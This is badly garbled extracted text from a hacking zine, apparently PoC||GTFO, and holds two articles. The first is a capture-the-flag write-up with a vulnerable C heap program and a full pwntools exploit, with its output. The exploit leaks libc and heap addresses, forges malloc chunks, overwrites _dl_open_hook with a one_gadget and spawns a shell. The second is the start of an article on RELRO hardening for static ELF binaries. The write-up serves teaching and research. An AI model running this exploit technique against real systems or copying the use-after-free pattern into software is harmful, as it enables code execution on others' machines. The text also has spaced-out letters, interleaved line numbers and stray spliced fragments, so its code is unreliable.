char ∗ a l l o c s [ALLOC_CNT] = { 0 } ;
9
void myputs ( const char ∗ s ) {
11
write (1 , s , s tr len ( s ) ) ;
w r i t e ( 1 , " \n" , 1 ) ;
13 }
15 i n t r e a d _ i n t ( ) {
char b u f [ 1 6 ] = " " ;
17
s s i z e _ t c n t = r e a d ( 0 , buf , s i z e o f ( b u f ) −1) ;
i f ( c n t <= 0 ) {
19
e r r (1 , " read " ) ;
}
21
buf [ cnt ] = 0 ;
return a t o i ( b u f ) ;
23 }
25 void menu ( ) {
myputs ( " 1 ) a l l o c " ) ;
27
myputs ( " 2 ) w r i t e " ) ;
myputs ( " 3 ) p r i n t " ) ;
29
myputs ( " 4 ) f r e e " ) ;
}
31
void a l l o c _ i t ( i n t s l o t ) {
33
a l l o c s [ s l o t ] = m a l l o c ( 0 x300 ) ;
}
35
void w r i t e _ i t ( i n t s l o t ) {
37
r e a d ( 0 , a l l o c s [ s l o t ] , 0 x300 ) ;
}
39
void p r i n t _ i t ( i n t s l o t ) {
41
myputs ( a l l o c s [ s l o t ] ) ;
}
with commit d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc. After filling this cache, all our operations will behave as expected.
Understanding it is beyond the scope of this paper, and on versions before 2.26 it can be removed.
3043
45
void f r e e _ i t ( i n t s l o t ) {
free ( allocs [ slot ]) ;
}
47
49
51
53
55
57
59
61
63
65
67
69
71
73
75
i n t main ( i n t a r g c , char ∗ a r g v [ ] ) {
while ( 1 ) {
menu ( ) ;
int c h o i c e = read_int ( ) ;
myputs ( " s l o t ? (0 −9) " ) ;
int s l o t = read_int ( ) ;
i f ( s l o t < 0 | | s l o t > 9) {
exit (0) ;
}
switch ( c h o i c e ) {
case 1 :
alloc_it ( slot ) ;
break ;
case 2 :
write_it ( s l o t ) ;
break ;
case 3 :
print_it ( slot ) ;
break ;
case 4 :
free_it ( slot ) ;
break ;
default :
exit (0) ;
}
}
return 0 ;
}
A solution to a challenge always start with some
boilerplate. Defining functions to invoke specific
functions in the remote target and some convenience
functions. We use the brilliant Pwn library for com-
munication with the vulnerable process, conversion
of values, parsing ELF files and probably some other
things. 27
This code is quite self-explanatory. alloc_it,
print_it, write_it, free_it invoke their corre-
sponding functions in the remote target. The chunk
function receives an offset and a dictionary of fields
of a malloc_chunk and their values and returns a
dictionary of the offsets to which the values should
be written. For example, chunk(offset=0x20,
bk=0xdeadbeef) returns {56: 3735928559} as
the offset of bk field is 0x18 thus 0x18 + 0x20 is 56
(and 0xdeadbeef is 3735928559). The chunk func-
tion is used in combination with pwn’s fit function
which writes specific values at specific offsets. 28
The purpose of the challenge is to execute arbi-
trary code on a remote service executing the code
above. We see that in the globals section there is
an array of ten pointers. As clients, we have the
following options:
Now, the first thing we want to do to solve this
challenge is to know the base address of libc, so we
can derive the locations of various data in libc—and
also the address of the heap, so we can craft pointers
to our controlled data.
1. Allocate a chunk of size 0x300 and assign its
address to any of the pointers in the array.
2. Write 0x300 bytes to a chunk pointed by a
pointer in the array.
3. Print the contents of any chunk pointed in the
array.
As we can print chunks after freeing them, leak-
ing these addresses is quite easy. By freeing two
non-consecutive chunks and reading their fd point-
ers (the field which coincides with the pointer re-
turned to the caller when a chunk is allocated), we
can read the address of the unsorted bin because
the first chunk in it points to its address. And we
can also read the address of that chunk by reading
the fd pointer of the second freed chunk, because it
points to the first chunk in the bin. See Figure 15.
4. Free any pointer in the array.
5. Exit.
The vulnerability here is straightforward: Use-
After-Free. As no code ever zeros the pointers in
the array, the chunks pointed by them are accessi-
ble after free. It is also possible to double-free a
pointer.
27 http://docs.pwntools.com/en/stable/index.html
28 The
base parameter is just for pretty-printing the hexdumps in the real memory addresses
311 from pwn import ∗
3 LIBC_FILE = ’ . / l i b c . s o . 6 ’
l i b c = ELF( LIBC_FILE )
5 main = ELF( ’ . / 3 0 0 ’ )
7 c o n t e x t . a r c h = ’ amd64 ’
9 r = main . p r o c e s s ( env={ ’LD_PRELOAD ’ : l i b c . path } )
11 d2 = s u c c e s s
def menu ( s e l , s l o t ) :
13
r . s e n d l i n e a f t e r ( ’ 4 ) f r e e \n ’ , s t r ( s e l ) )
r . s e n d l i n e a f t e r ( ’ s l o t ? (0 −9) \n ’ , s t r ( s l o t ) )
15
def a l l o c _ i t ( s l o t ) :
17
d2 ( " a l l o c {} " . format ( s l o t ) )
menu ( 1 , s l o t )
19
def p r i n t _ i t ( s l o t ) :
21
d2 ( " p r i n t {} " . format ( s l o t ) )
menu ( 3 , s l o t )
23
r e t = r . r e c v u n t i l ( ’ \ n1 ) ’ , drop=True )
d2 ( " r e c e i v e d : \ n{} " . format ( hexdump ( r e t ) ) )
25
return r e t
27 def w r i t e _ i t ( s l o t , buf , b a s e =0) :
d2 ( " w r i t e { } : \ n{} " . format ( s l o t , hexdump ( buf , b e g i n=b a s e ) ) )
29
menu ( 2 , s l o t )
## The i n t e r a c t i o n w i t h t h e b i n a r y i s t o o f a s t , and some o f t h e d a t a i s n o t
31
## w r i t t e n p r o p e r l y .
This s h o r t d e l a y f i x i t .
time . s l e e p ( 0 . 0 0 1 )
33
r . send ( b u f )
35 def f r e e _ i t ( s l o t ) :
d2 ( " f r e e {} " . format ( s l o t ) )
37
menu ( 4 , s l o t )
39 def m e r g e _ d i c t s ( ∗ d i c t s ) :
""" r e t u r n sum ( d i c t s ) """
41
return {k : v f o r d in d i c t s f o r k , v in d . i t e m s ( ) }
43 def chunk ( o f f s e t =0 , b a s e =0 , ∗∗ kwargs ) :
""" b u i l d d i c t i o n a r y o f o f f s e t s and v a l u e s a c c o r d i n g t o f i e l d name and b a s e o f f s e t """
45
f i e l d s = [ ’ p r e v _ s i z e ’ , ’ s i z e ’ , ’ f d ’ , ’ bk ’ , ’ f d _ n e x t s i z e ’ , ’ b k _ n e x t s i z e ’ , ]
d2 ( " c r a f t chunk { } : {} " . format (
47
’ ({:# x } ) ’ . format ( b a s e + o f f s e t ) i f b a s e e l s e ’ ’ ,
’ ’ . j o i n ( ’ {}={:#x} ’ . format ( name , kwargs [ name ] ) f o r name in f i e l d s i f name in kwargs ) ) )
49
o f f s = {name : o f f ∗8 f o r o f f , name in enumerate ( f i e l d s ) }
51
return { o f f s e t+o f f s [ name ] : kwargs [ name ] f o r name in f i e l d s i f name in kwargs }
53 ## uncomment t h e n e x t l i n e t o s e e e x t r a communication and debug s t r i n g s
#c o n t e x t . l o g _ l e v e l = ’ debug ’
322
4
MAIN ARENA
6
8
10
12
14
16 HEAP
18
20
+−−−−−−−−−−−−−−−−+
| UNSORTED BIN |
+−−−−−−−−−−−−−−−−−−−−−−−−−−−+−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−+
|
|
fd
|
bk
|
|
|
+−−−−−−−−−−−−−>
|
<−−−−−−−−−−−−−−+
|
|
|
|
|
|
|
|
|
|
+−−−−−−−−−+
|
+−−−−−−−−−−−−+
|
|
|
|
|
|
|
|
|
|
|
+−−−−−−−−−−−−−−−−−−−+−−−−−−−+−−−−−−−−+−−−−−−−−−−−−−−−−−−−−−−−−−−−−−+
|
|
|
|
|
| +−−−−−−−−−−−−−−−−−−−+
|
|
|
| |
|
|
|
|
| |
+−−−−−−−−−−−−−−−−−−−−+ |
|
|
| |
|
|
| |
|
|
+−−v−v−−−+ |
|
+−−v−v−−−+ |
|
| CHUNK3 |
|
|
| CHUNK1 |
|
|
+−−−−−−−−+ |
|
+−−−−−−−−+ |
|
|
fd
+ −−+
|
|
fd
+ −−+
|
+−−−−−−−−+
|
+−−−−−−−−+
+ −−−+
bk
|
+ −−−−+
bk
|
+−−−−−−−−+
+−−−−−−−−+
Figure 15
It will produce something like the following output.
We can quickly test this arrangement in Python.
i n f o ( " l e a k i n g unsorted bin address " )
2 alloc_it (0)
alloc_it (1)
4 alloc_it (2)
alloc_it (3)
6 alloc_it (4)
free_it (1)
8 free_it (3)
leak = print_it (1)
10 u n s o r t e d _ b i n = u64 ( l e a k . l j u s t ( 8 , ’ \ x00 ’ ) )
i n f o ( ’ u n s o r t e d b i n {:#x} ’ . format (
12
unsorted_bin ) )
UNSORTED_OFFSET = 0 x3c1b58
14 l i b c . a d d r e s s=unsorted_bin−UNSORTED_OFFSET
i n f o ( " l i b c b a s e a d d r e s s {:#x} " . format (
16
l i b c . address ) )
18 i n f o ( " l e a k i n g heap " )
leak = print_it (3)
20 chunk1_addr = u64 ( l e a k . l j u s t ( 8 , ’ \ x00 ’ ) )
heap_base = chunk1_addr − 0 x310
22 i n f o ( ’ heap {:#x} ’ . format ( heap_base ) )
24 i n f o ( " c l e a n i n g a l l
free_it (0)
26 f r e e _ i t ( 2 )
free_it (4)
allocations ")
1 [ ∗ ]
[+]
3 [+]
[+]
5 [+]
[+]
7 [+]
[+]
9 [+]
[+]
11
[ ∗ ]
13 [ ∗ ]
[ ∗ ]
15 [ + ]
[+]
17
[ ∗ ]
19 [ ∗ ]
[+]
21 [ + ]
[+]
33
l e a k i n g unsorted bin address
alloc 0
alloc 1
alloc 2
alloc 3
alloc 4
free 1
free 3
print 1
received :
00000000 58 db 45 3 f
55 7 f
unsorted bin 0 x7f553f45db58
l i b c base address 0 x7f553f09c000
l e a k i n g heap
print 3
received :
00000000 10 c3 84 6 e 0 a 56
heap 0 x 5 6 0 a 6 e 8 4 c 0 0 0
cleaning a l l allocations
free 0
free 2
free 4Now that we know the address of libc and the
heap, it’s time to craft our frontlink attack. First,
we need to have a chunk we control in the large bin.
Unfortunately, the challenge’s constraints do not let
us free a chunk with a controlled size. However, we
can control a freed chunk in the unsorted bin. As
chunks inserted to the large bin are first removed
from the unsorted bin, this provides us with a prim-
itive which is sufficient to our needs.
We overwrite the bk of a chunk in the unsorted
bin.
i n f o ( " populate unsorted bin " )
2 alloc_it (0)
alloc_it (1)
4 free_it (0)
6 i n f o ( " h i j a c k unsorted bin " )
## c o n t r o l l e d chunk #1 i s our l e a k e d chunk
8 c o n t r o l l e d = chunk1_addr + 0 x10
chunk0_addr = heap_base
10 w r i t e _ i t ( 0 , f i t ( chunk ( b a s e=chunk0_addr+0x10 ,
o f f s e t =−0x10 ,
12
bk=c o n t r o l l e d ) ) ,
b a s e=chunk0_addr+0x10 )
14 a l l o c _ i t ( 3 )
write the bk pointer of a chunk which starts 0x10 be-
fore the allocation of slot 0 (offset=-0x10), i.e., the
chunk in the unsorted bin. When making another
allocation, the chunk in the unsorted bin is removed
and returned to the caller and the bk pointer of the
unsorted bin is updated to point to the bk of the
removed chunk.
Now that the bk of the unsorted bin pointer
points to the controlled region in slot 1, we forge
a list that has a fake chunk with size 0x400, as this
size belongs in the large bin, and another chunk of
size 0x310. When requesting another allocation of
size 0x300, the first chunk is sorted and inserted to
the large bin and the second chunk is immediately
returned to the caller.
i n f o ( " populate l a r g e bin " )
2 w r i t e _ i t ( 1 , f i t ( merge_dicts (
chunk ( b a s e=c o n t r o l l e d , o f f s e t =0x0 ,
4
s i z e =0x401 , bk=c o n t r o l l e d +0x30 ) ,
chunk ( b a s e=c o n t r o l l e d , o f f s e t =0x30 ,
6
s i z e =0x311 , bk=c o n t r o l l e d +0x60 ) ,
)))
8 alloc_it (3)
[ ∗ ] populate l a r g e bin
2 [ + ] c r a f t chunk ( 0 x 5 6 0 a 6 e 8 4 c 3 2 0 ) :
s i z e =0x401 bk=0x 5 6 0 a 6 e 8 4 c 3 5 0
4 [ + ] c r a f t chunk ( 0 x 5 6 0 a 6 e 8 4 c 3 5 0 ) :
s i z e =0x311 bk=0x 5 6 0 a 6 e 8 4 c 3 8 0
6 [+] write 1:
560 a 6 e 8 4 c 3 2 0 61 61 61 61 62
8
01 04 00 00 00
560 a 6 e 8 4 c 3 3 0 65 61 61 61 66
10
50 c3 84 6 e 0 a
560 a 6 e 8 4 c 3 4 0 69 61 61 61 6 a
12
6b 61 61 61 6 c
560 a 6 e 8 4 c 3 5 0 6d 61 61 61 6 e
14
11 03 00 00 00
560 a 6 e 8 4 c 3 6 0 71 61 61 61 72
16
80 c3 84 6 e 0 a
[+] a l l o c 3
[ ∗ ]
2 [+]
[+]
4 [+]
[ ∗ ]
6 [+]
populate unsorted bin
alloc 0
alloc 1
free 0
h i j a c k unsorted bin
c r a f t chunk ( 0 x 5 6 0 a 6 e 8 4 c 0 0 0 ) : bk=0
x560a6e84c320
[+] write 0:
8
560 a 6 e 8 4 c 0 1 0 61 61 61 61 62 61 61 61
20 c3 84 6 e 0 a 56 00 00
10 [ + ] a l l o c 3
61
00
61
56
61
61
61
00
61
56
61
00
61
00
61
61
61
00
61
00
61
00
61
00
61
61
61
00
61
00
Perfect! we have a chunk in our control in the
large bin. It’s time to corrupt this chunk!
We point the bk and bk_nextsize of this chunk
before the _dl_open_hook and put some more
forged chunks in the unsorted bin. The first chunk
will be the chunk which its address is written to
_dl_open_hook so it must have a size bigger then
0x400 yet belongs in the same bin. The next chunk
is of size 0x310 so it is returned to the caller after
request of allocation of 0x300 and after inserting the
0x410 into the large bin and performing the attack.
Here we allocated two chunks and free the first,
which inserts it to the unsorted bin. Then we over-
341 i n f o ( """ f r o n t l i n k attack : h i j a c k
_dl_open_hook ({:# x } ) " " " . f o r m a t (
3
l i b c . symbols [ ’ _dl_open_hook ’ ] ) )
w r i t e _ i t ( 1 , f i t ( merge_dicts (
5
chunk ( b a s e=c o n t r o l l e d , o f f s e t =0x0 ,
s i z e =0x401 ,
7
# We don ’ t have t o u s e both f i e l d s t o
# o v e r w r i t e _dl_open_hook . One i s enough
9
# but both must p o i n t t o a w r i t a b l e
# address .
11
bk=l i b c . symbols [ ’ _dl_open_hook ’ ] − 0 x10 ,
b k _ n e x t s i z e=
13
l i b c . symbols [ ’ _dl_open_hook ’ ] − 0 x20 ) ,
chunk ( b a s e=c o n t r o l l e d , o f f s e t =0x60 ,
15
s i z e =0x411 , bk=c o n t r o l l e d + 0 x90 ) ,
chunk ( b a s e=c o n t r o l l e d , o f f s e t =0x90 , s i z e =0
x311 ,
17
bk=c o n t r o l l e d + 0 xc0 ) ,
) ) , b a s e=c o n t r o l l e d )
19 a l l o c _ i t ( 3 )
This allocation overwrites _dl_open_hook with
the address of controlled+0x60, the address of the
0x410 chunk.
Now it’s time to hijack the flow. We over-
write offset 0x60 of the controlled chunk with
one_gadget, an address when jumped to executes
exec("/bin/bash"). We also write an easily de-
tectable bad size to the next chunk in the unsorted
bin, then make an allocation. The allocator detects
the bad size and tries to abort. The abort process in-
vokes _dl_open_hook->dlopen_mode which we set
to be the one_gadget and we get a shell! See Fig-
ure 16 for the code.
2
4
6
1 [ ∗ ]
3 [+]
5
[+]
7
[+]
9
[+]
11
13
15
17
19
21
23
25
27
29
31
33 [ + ]
f r o n t l i n k attack :
h i j a c k _dl_open_hook ( 0 x 7 f 5 5 3 f 4 6 2 2 e 0 )
c r a f t chunk ( 0 x 5 6 0 a 6 e 8 4 c 3 2 0 ) :
s i z e =0x401 bk=0x 7 f 5 5 3 f 4 6 2 2 d 0
b k _ n e x t s i z e=0 x 7 f 5 5 3 f 4 6 2 2 c 0
c r a f t chunk ( 0 x 5 6 0 a 6 e 8 4 c 3 8 0 ) :
s i z e =0x411 bk=0x 5 6 0 a 6 e 8 4 c 3 b 0
c r a f t chunk ( 0 x 5 6 0 a 6 e 8 4 c 3 b 0 ) :
s i z e =0x311 bk=0x 5 6 0 a 6 e 8 4 c 3 e 0
write 1:
560 a 6 e 8 4 c 3 2 0 61 61 61 61 62 61 61 61
01 04 00 00 00 00 00 00
560 a 6 e 8 4 c 3 3 0 65 61 61 61 66 61 61 61
d0 22 46 3 f
55 7 f 00 00
560 a 6 e 8 4 c 3 4 0 69 61 61 61 6 a 61 61 61
c0 22 46 3 f
55 7 f 00 00
560 a 6 e 8 4 c 3 5 0 6d 61 61 61 6 e 61 61 61
6 f 61 61 61 70 61 61 61
560 a 6 e 8 4 c 3 6 0 71 61 61 61 72 61 61 61
73 61 61 61 74 61 61 61
560 a 6 e 8 4 c 3 7 0 75 61 61 61 76 61 61 61
77 61 61 61 78 61 61 61
560 a 6 e 8 4 c 3 8 0 79 61 61 61 7 a 61 61 62
11 04 00 00 00 00 00 00
560 a 6 e 8 4 c 3 9 0 64 61 61 62 65 61 61 62
b0 c3 84 6 e 0 a 56 00 00
560 a 6 e 8 4 c 3 a 0 68 61 61 62 69 61 61 62
6 a 61 61 62 6b 61 61 62
560 a 6 e 8 4 c 3 b 0 6 c 61 61 62 6d 61 61 62
11 03 00 00 00 00 00 00
560 a 6 e 8 4 c 3 c 0 70 61 61 62 71 61 61 62
e0 c3 84 6 e 0 a 56 00 00
alloc 3
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
38
[ ∗ ] s e t _dl_open_hook−>dlmode
= ONE_GADGET ( 0 x 7 f 5 5 3 f 1 8 d 6 5 1 )
[ ∗ ] and make t h e n e x t chunk removed from t h e
u n s o r t e d b i n t r i g g e r an e r r o r
[ + ] c r a f t chunk ( 0 x 5 6 0 a 6 e 8 4 c 3 e 0 ) : s i z e =−0x1
[+] write 1:
560 a 6 e 8 4 c 3 2 0 61 61 61 61 62 61 61 61
63 61 61 61 64 61 61 61
560 a 6 e 8 4 c 3 3 0 65 61 61 61 66 61 61 61
67 61 61 61 68 61 61 61
560 a 6 e 8 4 c 3 4 0 69 61 61 61 6 a 61 61 61
6b 61 61 61 6 c 61 61 61
560 a 6 e 8 4 c 3 5 0 6d 61 61 61 6 e 61 61 61
6 f 61 61 61 70 61 61 61
560 a 6 e 8 4 c 3 6 0 71 61 61 61 72 61 61 61
73 61 61 61 74 61 61 61
560 a 6 e 8 4 c 3 7 0 75 61 61 61 76 61 61 61
77 61 61 61 78 61 61 61
560 a 6 e 8 4 c 3 8 0 51 d6 18 3 f
55 7 f 00 00
62 61 61 62 63 61 61 62
560 a 6 e 8 4 c 3 9 0 64 61 61 62 65 61 61 62
66 61 61 62 67 61 61 62
560 a 6 e 8 4 c 3 a 0 68 61 61 62 69 61 61 62
6 a 61 61 62 6b 61 61 62
560 a 6 e 8 4 c 3 b 0 6 c 61 61 62 6d 61 61 62
6 e 61 61 62 6 f 61 61 62
560 a 6 e 8 4 c 3 c 0 70 61 61 62 71 61 61 62
72 61 61 62 73 61 61 62
560 a 6 e 8 4 c 3 d 0 74 61 61 62 75 61 61 62
76 61 61 62 77 61 61 62
560 a 6 e 8 4 c 3 e 0 78 61 61 62 79 61 61 62
ff ff ff ff
ff ff ff ff
[ ∗ ] c a u s e an e x c e p t i o n − chunk i n u n s o r t e d
b i n with bad s i z e , t r i g g e r
_dl_open_hook−>dlmode
[+] a l l o c 3
[ ∗ ] flag :
34 C3_but_does_your_exploit_work_on_1710_too
Voila!
351 ONE_GADGET = l i b c . a d d r e s s + 0 x f 1 6 5 1
i n f o ( " s e t _dl_open_hook−>dlmode = ONE_GADGET ({:# x } ) " . format (ONE_GADGET) )
3 i n f o ( " and make t h e n e x t chunk removed from t h e u n s o r t e d b i n t r i g g e r an e r r o r " )
w r i t e _ i t ( 1 , f i t ( m e r g e _ d i c t s ( {0 x60 :ONE_GADGET} ,
5
chunk ( b a s e=c o n t r o l l e d , o f f s e t =0xc0 , s i z e =−1) , ) ) ,
b a s e=c o n t r o l l e d )
7
i n f o ( """ c a u s e an e x c e p t i o n − chunk i n u n s o r t e d b i n w i t h bad s i z e ,
9
t r i g g e r _dl_open_hook−>dlmode """ )
alloc_it (3)
11
r . r e c v l i n e _ c o n t a i n s ( ’ m a l l o c ( ) : memory c o r r u p t i o n ’ )
13 r . s e n d l i n e ( ’ c a t f l a g ’ )
i n f o ( " f l a g : {} " . format ( r . r e c v l i n e ( ) ) )
Figure 16. This dumps the flag!
Closing Words
Glibc malloc’s insecurity is a never ending story.
The inline-metdata approach keeps presenting new
opportunities for exploiters. (Take a look at the new
tcache thing in version 2.26.) And even the old
ones, as we learned today, are not mitigated. They
are just there, floating around, waiting for any UAF
or overflow. Maybe it’s time to change the design of
libc altogether.
Another important lesson we learned is to al-
ways check the details. Reading the source or disas-
sembly yourself takes courage and persistence, but
fortune prefers the brave. Double check the mit-
igations. Re-read the old materials. Some things
that at the time were considered useless and forgot-
ten may prove valuable in different situations. The
past, like the future, holds many surprises.
3618:06
RelroS: Read Only Relocations for Static ELF
by Ryan “ElfMaster” O’Neill
This paper is going to shed some insights into
the more obscure security weaknesses of statically
linked executables: the glibc initialization process,
what the attack surface looks like, and why the secu-
rity mitigation known as RELRO is as equally im-
portant for static executables as it is for dynamic
executables. We will discuss some solutions, and
explore the experimental software that I have pre-
sented as a solution for enabling RELRO binaries
that are statically linked, usually to avoid complex
dependecy issues. We will also take a look at ASLR,
and innovate a solution for making it work on stat-
ically linked executables.
built this way.
Somewhere along the way came RELRO (read-
only relocations) a security mitigation technique
that has two modes: partial and full. By default
only the partial relro is enforced because full-relro
requires strict linking which has less efficient pro-
gram loading time due to the dynamic linker bind-
ing/relocating immediately (strict) vs. lazy. but full
RELRO can be very powerful for hardening the at-
tack surface by marking specific areas in the data
segment as read-only. Specifically the .init_array,
.fini_array, .jcr, .got, .got.plt sections. The
.got.plt section and .fini_array are the most fre-
quent targets for attackers since these contain func-
tion pointers into shared library routines and de-
structor routines, respectively.
Standard ELF Security Mitigations
Over the years there have been some innovative and
progressive overhauls that have been incorporated
into glibc, the linker, and the dynamic linker, in
order to make certain security mitigations possible.
Firstly there was Pipacs who decided that making
ELF programs that would otherwise be ET_EXEC
(executables) could benefit from becoming ET_DYN
objects, which are shared libraries. if a PT_INTERP
segment is added to an ET_DYN object to specify an
interpreter then ET_DYN objects can be linked as ex-
ecutable programs which are position independent
executables, “-fPIC -pie” and linked with an ad-
dress space that begins at 0x0. This type of exe-
cutable has no real absolute address space until it
has been relocated into a randomized address space
by the kernel. A PIE executable uses IP relative
addressing mode so that it can avoid using absolute
addresses; consequently, a program that is an ELF
ET_DYN can make full use of ASLR.
(ASLR can work with ET_EXEC’s with PaX using
a technique called VMA mirroring, 29 but I can’t say
for sure if its still supported and it was never the
preferred method.)
When an executable runs privileged, such as
sshd, it would ideally be compiled and linked into
a PIE executable which allows for runtime reloca-
tion to a random address space, thus hardening the
attack surface into far more hostile playing grounds.
Try running readelf -e /usr/sbin/sshd |
grep DYN and you will see that it is (most likely)
29 VMA
What about static linking?
Developers like statically linked executables because
they are easier to manage, debug, and ship; every-
thing is self contained. The chances of a user run-
ning into issues with a statically linked executable
are far less than with a dynamically linked exe-
cutable which require dependencies, sometimes hun-
dreds of them. I’ve been aware of this for some time,
but I was remiss to think that statically linked ex-
ecutables don’t suffer from the same ELF security
problems as dynamically linked executables! To my
surprise, a statically linked executable is vulnera-
ble to many of the same attacks as a dynamically
linked executable, including shared library injection,
.dtors (.fini_array) poisoning, and PLT/GOT
poisoning.
This might surprise you; shouldn’t a static exe-
cutable be immune to relocation table tricks? Let’s
start with shared library injection. A shared library
can be injected into the process address space us-
ing ptrace injected shellcode for malware purposes,
however if full RELRO is enabled coupled with PaX
mprotect restrictions this becomes impossible since
the PaX feature prevents the default behavior of al-
lowing ptrace to write to read-only segments and
full RELRO would ensure read-only protections on
the relevant data segment areas. Now, from an ex-
ploitation standpoint this becomes more interest-
Mirroring by PaX Team: unzip pocorgtfo18.pdf vmmirror.txt
37ing when you realize that the PLT/GOT is still a
thing in statically linked executables, and we will
discuss it shortly, but in the meantime just know
that the PLT/GOT contains function pointers to
libc routines. The .init_array/.fini_array func-
tion pointers respectively point to initialization and
destructor routines. Specifically .dtors has been
used to achieve code execution in many types of ex-
ploits, although I doubt its abuse is ubiquitous as
the .got.plt section itself. Let’s take a tour of
a statically linked executable and analyze the finer
points of the security mitigations–both present and
absent–that should be considered before choosing to
statically link a program that is sensitive or runs
privileged.
namic segment flag since there are no dynamic seg-
ments in statically linked executables. Let’s take a
lightweight tour through the init code of a statically
compiled executable.
From the output in Figure 17, you will notice
that there is a .got and .got.plt section within
the data segment, and to enable full RELRO these
are normally merged into one section but for our
purposes that is not necessary since the tool I de-
signed ’relros’ marks both of them as read-only.
Overview of Statically Linked ELF
A high level overview can be seen with the ftrace
tool, shown in Figure 18. 31
Most of the heavy lifting that would normally
take place in the dynamic linker is performed by the
function generic_start_main() which in addition
to other tasks also performs various relocations and
fixups to all the many sections in the data segment,
including the .got.plt section, in which case you
can setup a few watch points to observe that early
on there is a function that inquires about CPU in-
formation such as the CPU cache size, which allows
glibc to intelligently determine which version of a
given function, such as strcpy(), should be used.
In Figure 19, we set watch points on the GOT
entries for several shared library routines and notice
that generic_start_main() serves, in some sense,
much like a dynamic linker. Its job is largely to
perform relocations and fixups.
So in both cases the GOT entry for a given libc
function had its PLT stub address replaced with
the most efficient version of the function given the
CPU cache size looked up by certain glibc init code
(i.e. __cache_sysconf()). Since this a somewhat
high level overview I will not go into every function,
but the important thing is to see that the PLT/-
GOT is updated with a libc function, and can be
poisoned, especially since RELRO is not compati-
ble with statically linked executables. This leads
us into the solution, or possible solutions, including
our very own experimental prototype named relros,
which uses some ELF trickery to inject code that
is called by a trampoline that has been placed in
a very specific spot. It is necessary to wait until
generic_start_main() has finished all of its writes
to the memory areas that we intend to mark as read-
only before we invoke our enable_relro() routine.
Demystifying the Ambiguous
The
static
binary
in
Figure
17
was
built with full RELRO flags, gcc -static
-Wl,-z,relro,-z,now. And even the savvy re-
verser might be fooled into thinking that RELRO
is in-fact enabled. partial-RELRO and full-RELRO
are both incompatible with statically compiled bi-
naries at this point in time, because the dynamic
linker is responsible for re-mapping and mprotecting
the common attack points within the data segment,
such as the PLT/GOT, and as shown in Figure 17
there is no PT_INTERP to specify an interpreter nor
would we expect to see one in a statically linked
binary. The default linker script is what directs
the linker to create the GNU_RELRO segment, even
though it serves no current purpose.
Notice that the GNU_RELRO segment points to
the beginning of the data segment which is usu-
ally where you would want the dynamic linker to
mprotect n bytes as read-only. however, we really
don’t want .tdata marked as read-only, as that will
prevent multi-threaded applications from working.
So this is just another indication that the stati-
cally built binary does not actually have any plans
to enable RELRO on itself. Alas, it really should, as
the PLT/GOT and other areas such as .fini_array
are as vulnerable as ever. A common tool named
checksec.sh uses the GNU_RELRO segment as one of
the markers to denote whether or not RELRO is
enabled on a binary, 30 and in the case of statically
compiled binaries it will report that partial-relro is
enabled, because it cannot find a DT_BIND_NOW dy-
30 unzip
31 git
pocorgtfo18.pdf checksec.sh # http://www.trapkit.de/tools/checksec.html
clone https://github.com/elfmaster/ftrace
38$ g c c − s t a t i c −Wl,−z , r e l r o ,−z , now t e s t . c −o t e s t
$ r e a d e l f − l t e s t
E l f f i l e t y p e i s EXEC ( E x e c u t a b l e f i l e )
Entry p o i n t 0 x4008b0
There a r e 6 program h e a d e r s , s t a r t i n g a t o f f s e t 64
Program Headers :
Type
Offset
FileSiz
LOAD
0 x0000000000000000
0 x00000000000cbf67
LOAD
0 x00000000000cceb8
0 x0000000000001cb8
NOTE
0 x0000000000000190
0 x0000000000000044
TLS
0 x00000000000cceb8
0 x0000000000000020
GNU_STACK
0 x0000000000000000
0 x0000000000000000
GNU_RELRO
0 x00000000000cceb8
0 x0000000000000148
VirtAddr
MemSiz
0 x0000000000400000
0 x00000000000cbf67
0 x00000000006cceb8
0 x0000000000003570
0 x0000000000400190
0 x0000000000000044
0 x00000000006cceb8
0 x0000000000000050
0 x0000000000000000
0 x0000000000000000
0 x00000000006cceb8
0 x0000000000000148
PhysAddr
Flags
Align
0 x0000000000400000
R E
200000
0 x00000000006cceb8
RW
200000
0 x0000000000400190
R
4
0 x00000000006cceb8
R
8
0 x0000000000000000
RW
10
0 x00000000006cceb8
R
1
S e c t i o n t o Segment mapping :
Segment S e c t i o n s . . .
00
. n o t e . ABI−t a g . n o t e . gnu . b u i l d −i d . r e l a . p l t . i n i t . p l t . t e x t _ _ l i b c _ f r e e r e s _ f n
__libc_thread_freeres_fn . f i n i . rodata __libc_subfreeres __libc_atexit
. s t a p s d t . b a s e _ _ l i b c _ t h r e a d _ s u b f r e e r e s . eh_frame . g c c _ e x c e p t _ t a b l e
01
. t d a t a . i n i t _ a r r a y . f i n i _ a r r a y . j c r . data . r e l . r o . g o t . g o t . p l t . data . b s s
__libc_freeres_ptrs
02
. n o t e . ABI−t a g . n o t e . gnu . b u i l d −i d
03
. tdata . tbss
04
05
. t d a t a . i n i t _ a r r a y . f i n i _ a r r a y . j c r . data . r e l . r o . g o t
Figure 17. RELRO is Broken for Static Executables
$ f t r a c e test_binary
LOCAL_call@0x404fd0 : __libc_start_main ( )
LOCAL_call@0x404f60 : get_common_indeces . c o n s t p r o p . 1 ( )
(RETURN VALUE) LOCAL_call@0x404f60 : get_common_indeces . c o n s t p r o p . 1 ( ) = 3
LOCAL_call@0x404cc0 : g e n e r i c _ s t a r t _ m a i n ( )
LOCAL_call@0x447cb0 : _dl_aux_init ( ) (RETURN VALUE) LOCAL_call@0x447cb0 :
_dl_aux_init ( ) = 7 f f e c 5 3 6 0 b f 9
LOCAL_call@0x4490b0 : _ d l _ d i s c o v e r _ o s v e r s i o n ( 0 x 7 f f e c 5 3 6 0 b e 8 )
LOCAL_call@0x46f5e0 : uname ( ) LOCAL_call@0x46f5e0 : __uname ( )
<t r u n c a t e d >
Figure 18. FTracing a Static ELF
39( gdb ) x/ gx 0 x6d0018 /∗ . g o t . p l t e n t r y f o r s t r c p y ∗/
0 x6d0018 : 0 x 0 0 0 0 0 0 0 0 0 0 4 3 f 6 0 0
( gdb ) watch ∗0 x6d0018
Hardware w a t c h p o i n t 3 : ∗0 x6d0018
( gdb ) x/ gx
/∗ . g o t . p l t e n t r y f o r memmove ∗/
0 x6d0020 : 0 x0000000000436da0
( gdb ) watch ∗0 x6d0020
Hardware w a t c h p o i n t 4 : ∗0 x6d0020
( gdb ) run
The program b e i n g debugged has been s t a r t e d a l r e a d y .
